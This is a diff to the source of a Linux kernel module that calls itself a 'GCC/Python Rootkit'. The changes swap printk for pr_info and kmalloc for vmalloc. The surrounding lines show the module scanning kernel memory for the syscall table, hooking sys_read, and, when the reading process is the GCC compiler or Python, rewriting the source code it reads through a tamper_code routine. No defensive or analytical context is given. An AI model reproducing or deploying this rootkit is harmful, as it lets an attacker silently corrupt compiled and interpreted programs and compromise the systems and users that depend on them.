@@ -12,7 +12,7 @@
 */
 
 #include <linux/module.h>   /* For modules */
-#include <linux/kernel.h>   /* Helper functions like printk */
+#include <linux/kernel.h>   /* Helper functions like pr_info */
 #include <linux/syscalls.h> /* The syscall table and __NR_<syscall_name> helpers */
 #include <asm/paravirt.h>   /* Read_cr0, write_cr0 */
 #include <linux/slab.h>     /* Current task_struct */
@@ -55,33 +55,33 @@ rk_sys_read(unsigned int fd,
         /* Current task */
         if(strncmp(current->comm, "cc1",    3) == 0 || 
            strncmp(current->comm, "python", 5) == 0) {
-            printk("[*] He's compiling, again.\n");
+            pr_info("[*] He's compiling, again.\n");
 
             if(count > PAGE_SIZE) {
-                printk("[!] Rootkit is not allocating %lx Bytes (PAGE_SIZE: %lx B)\n", count, PAGE_SIZE);
+                pr_info("[!] Rootkit is not allocating %lx Bytes (PAGE_SIZE: %lx B)\n", count, PAGE_SIZE);
                 return returnValue;
             }
 
-            kernel_buffer = kmalloc(count, GFP_KERNEL);
+            kernel_buffer = vmalloc(count);
             if(!kernel_buffer) {
-                printk("[!] Rootkit failed to allocate %lx Bytes!\n", count);
+                pr_info("[!] Rootkit failed to allocate %lx Bytes!\n", count);
                 return returnValue;
             }
 
             if(copy_from_user(kernel_buffer, buffer, count)) {
-                printk("[!] Rootkit failed to copy the read buffer!\n");
-                kfree(kernel_buffer);
+                pr_info("[!] Rootkit failed to copy the read buffer!\n");
+                vfree(kernel_buffer);
                 return returnValue;
             }
 
             /* Do bad things */
-            printk("[*] Original code:\n%s\n", kernel_buffer);
+            pr_info("[*] Original code:\n%s\n", kernel_buffer);
             tamper_code(&kernel_buffer, count);
 
             /* Copy the buffer back to the user-space */
             if(copy_to_user(buffer, kernel_buffer, returnValue))
-                printk("[!] Rootkit failed to copy the read buffer back to user-space\n");
-            kfree(kernel_buffer);
+                pr_info("[!] Rootkit failed to copy the read buffer back to user-space\n");
+            vfree(kernel_buffer);
         }
     }
 
@@ -99,12 +99,12 @@ get_syscall_table(void)
      * */
     unsigned long int offset = PAGE_OFFSET;
     unsigned long **sct;
-    printk("[*] Starting syscall table scan from: %lx\n", offset);
+    pr_info("[*] Starting syscall table scan from: %lx\n", offset);
     while(offset < ULLONG_MAX) {
         /* Cast starting offset to match syscall table's type */
         sct = (unsigned long **) offset;
         if(sct[__NR_close] == (unsigned long *) sys_close) {
-            printk("[*] Syscall table found at %lx\n", offset);
+            pr_info("[*] Syscall table found at %lx\n", offset);
             return sct;
         }
 
@@ -144,7 +144,7 @@ tamper_code(char **buffer,
 static int __init 
 rk_start(void)
 {
-    printk("[*] GCC/Python Rootkit starting.\n");
+    pr_info("[*] GCC/Python Rootkit starting.\n");
     if(!(sys_call_table = get_syscall_table()))
         return -1;
 
@@ -170,7 +170,7 @@ rk_start(void)
 static void __exit 
 rk_end(void)
 {
-    printk("[*] GCC/Python Rootkit stopping.\n");
+    pr_info("[*] GCC/Python Rootkit stopping.\n");
 
     if(!sys_call_table)
         return;
